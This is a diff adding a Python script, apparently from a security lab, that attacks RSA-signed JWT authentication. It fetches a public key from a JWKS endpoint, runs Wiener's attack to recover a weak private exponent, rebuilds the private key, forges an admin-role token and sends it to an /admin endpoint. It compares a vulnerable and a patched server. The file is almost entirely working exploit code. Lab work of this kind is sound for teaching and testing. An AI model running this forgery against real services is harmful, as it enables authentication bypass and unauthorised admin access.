@@ -1,0 +1,223 @@
+#!/usr/bin/env python3
+import sys
+import time
+import math
+from Crypto.PublicKey import RSA
+import requests
+import base64
+import json
+from Crypto.Signature import pkcs1_15
+from Crypto.Hash import SHA256
+import logging
+import os
+
+BASE_URL = "http://http_server_c:8000"
+HTTP_TIMEOUT = 10
+
+def b64url_decode(s: str) -> bytes:
+    rem = len(s) % 4
+    if rem:
+        s += "=" * (4 - rem)
+    return base64.urlsafe_b64decode(s.encode("ascii"))
+
+def jwk_to_rsa_pubkey(jwk: dict) -> RSA.RsaKey:
+    """
+    Convert a single RSA JWK (n,e) -> PyCryptodome RSA public key
+    """
+    n = int.from_bytes(b64url_decode(jwk["n"]), "big")
+    e = int.from_bytes(b64url_decode(jwk["e"]), "big")
+    return RSA.construct((n, e))
+
+def fetch_jwks(base_url: str) -> dict:
+    url = base_url.rstrip("/") + "/.well-known/jwks.json"
+    r = requests.get(url, timeout=HTTP_TIMEOUT)
+    r.raise_for_status()
+    return r.json()
+
+def pick_jwk(jwks: dict, kid: str | None = None) -> dict:
+    keys = jwks.get("keys", [])
+    if not keys:
+        raise ValueError("JWKS has no keys")
+    if kid is None:
+        # lab case: single key
+        return keys[0]
+    for k in keys:
+        if k.get("kid") == kid:
+            return k
+    raise ValueError(f"kid not found in JWKS: {kid}")
+
+def fetch_public_key_from_jwks(base_url: str, kid: str | None = None) -> RSA.RsaKey:
+    jwks = fetch_jwks(base_url)
+    jwk = pick_jwk(jwks, kid=kid)
+    return jwk_to_rsa_pubkey(jwk)
+
+def rsa_pubkey_to_pem(pub: RSA.RsaKey) -> bytes:
+    return pub.export_key(format="PEM")
+
+
+def integer_nth_root(n: int, k: int) -> int:
+    if n < 0:
+        raise ValueError("n must be non-negative")
+    if n == 0:
+        return 0
+    bits = n.bit_length()
+    lo = 1
+    hi = 1 << ((bits + k - 1) // k)
+    while lo < hi:
+        mid = (lo + hi + 1) // 2
+        mid_k = mid ** k
+        if mid_k <= n:
+            lo = mid
+        else:
+            hi = mid - 1
+    return lo
+
+def b64url_encode(b: bytes) -> str:
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode('ascii')
+
+def b64url_decode(s: str) -> bytes:
+    rem = len(s) % 4
+    if rem:
+        s += "=" * (4 - rem)
+    return base64.urlsafe_b64decode(s.encode('ascii'))
+
+def continued_fraction(a, b):
+    cf = []
+    while b:
+        q = a // b
+        cf.append(q)
+        a, b = b, a - q * b
+    return cf
+
+def convergents_from_cf(cf):
+    p0, q0 = 1, 0
+    p1, q1 = cf[0], 1
+    yield (p1, q1)
+    for a in cf[1:]:
+        p2 = a * p1 + p0
+        q2 = a * q1 + q0
+        yield (p2, q2)
+        p0, q0, p1, q1 = p1, q1, p2, q2
+
+def wiener_attack(e: int, n: int, max_candidates=10000):
+    cf = continued_fraction(e, n)
+    for i, (k, d_candidate) in enumerate(convergents_from_cf(cf)):
+        if i > max_candidates:
+            break
+        if k == 0:
+            continue
+        if (e * d_candidate - 1) % k != 0:
+            continue
+        phi_candidate = (e * d_candidate - 1) // k
+        s = n - phi_candidate + 1
+        discr = s * s - 4 * n
+        if discr < 0:
+            continue
+        r = integer_nth_root(discr, 2)
+        if r * r != discr:
+            continue
+        p = (s + r) // 2
+        q = (s - r) // 2
+        if p * q == n and p != 1 and q != 1:
+            return int(d_candidate), int(k)
+    return None, None
+
+def recover_p_q_from_phi(n: int, phi: int):
+    s = n - phi + 1
+    discr = s * s - 4 * n
+    if discr < 0:
+        return None, None
+    r = integer_nth_root(discr, 2)
+    if r * r != discr:
+        return None, None
+    p = (s + r) // 2
+    q = (s - r) // 2
+    if p * q == n:
+        return int(p), int(q)
+    return None, None
+def attack(TypeLab: str):
+    logging.info(f" Lab {TypeLab} - Wiener's Attack on RSA with small d")
+    pub = fetch_public_key_from_jwks(BASE_URL, kid=f"lab-{TypeLab.lower()}")  
+    pub_pem = rsa_pubkey_to_pem(pub)
+    logging.info(f"publickey: {pub_pem.decode()}")
+    start = time.time()
+    try:
+        rsa_pub = RSA.import_key(pub_pem)
+    except Exception as e:
+        logging.info(f"[!] Failed to parse public key PEM: {e}")
+        return
+
+    n, e = rsa_pub.n, rsa_pub.e
+    logging.info(f"[*] Parsed public key: n bitlen={n.bit_length()}, e={e}")
+    logging.info("[*] Running Wiener's attack ...")
+    d_found, k_found = wiener_attack(e, n)
+    if d_found is None:
+        logging.info("No weak d found.")
+        return
+    logging.info(f"[+] Wiener success: d={d_found}")
+
+    phi = (e * d_found - 1) // k_found if k_found else None
+    p, q = recover_p_q_from_phi(n, phi) if phi else (None, None)
+    from Crypto.PublicKey import RSA as RSA_mod
+    rsa_priv = RSA_mod.construct((n, e, d_found, p, q)) if p else RSA_mod.construct((n, e, d_found))
+
+    payload = {"sub": "attacker", "role": "admin", "iat": int(time.time()), "exp": int(time.time()) + 3600}
+    header = {"alg": "RS256", "typ": "JWT", "kid": f"lab-{TypeLab.lower()}"}
+    header_b = json.dumps(header, separators=(',', ':'), sort_keys=True).encode()
+    payload_b = json.dumps(payload, separators=(',', ':'), sort_keys=True).encode()
+    signing_input = b"%s.%s" % (b64url_encode(header_b).encode(), b64url_encode(payload_b).encode())
+    h = SHA256.new(signing_input)
+    sig = pkcs1_15.new(rsa_priv).sign(h)
+    token = signing_input.decode() + "." + b64url_encode(sig)
+    logging.info(f"[+] Forged JWT:\n{token}")
+
+    try:
+        h2 = SHA256.new(signing_input)
+        pkcs1_15.new(rsa_priv.publickey()).verify(h2, sig)
+        logging.info("[+] Verified local signature OK")
+    except Exception as e:
+        logging.info(f"[!] Local verify failed: {e}")
+
+    admin_url = BASE_URL.rstrip("/") + "/admin"
+    try:
+        logging.info(f"[*] Trying admin endpoint (via cookie): {admin_url}")
+        cookies = {"auth_token": token}
+        r = requests.get(admin_url, cookies=cookies, timeout=HTTP_TIMEOUT, verify=False)
+        try:
+            j = r.json()
+            logging.info(f"[*] /admin returned HTTP {r.status_code}:")
+            logging.info(json.dumps(j, indent=2))
+        except Exception:
+            logging.info(f"[*] /admin returned HTTP {r.status_code}: {r.text}")
+    except Exception as e:
+        logging.info(f"[!] Failed to call /admin: {e}")
+
+    total = time.time() - start
+    logging.info(f"[*] Complete. Total elapsed: {total:.3f}s")
+def main():
+    log_dir = os.getenv("LOG_DIR", "logs")
+    os.makedirs(log_dir, exist_ok=True)
+    log_path = os.path.join(log_dir, f"attackC_{time.strftime('%Y%m%d_%H%M%S')}.log")
+
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+
+    fmt = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+
+    ch = logging.StreamHandler(sys.stdout)
+    ch.setFormatter(fmt)
+    logger.addHandler(ch)
+
+    fh = logging.FileHandler(log_path, mode="w", encoding="utf-8")
+    fh.setFormatter(fmt)
+    logger.addHandler(fh)
+
+    logging.info(f"Logging to file: {log_path}")
+    logging.info("======================================================================================================================")
+    attack("Vuln")
+    logging.info("======================================================================================================================")
+    attack("Patched")
+
+
+if __name__ == "__main__":
+    main()
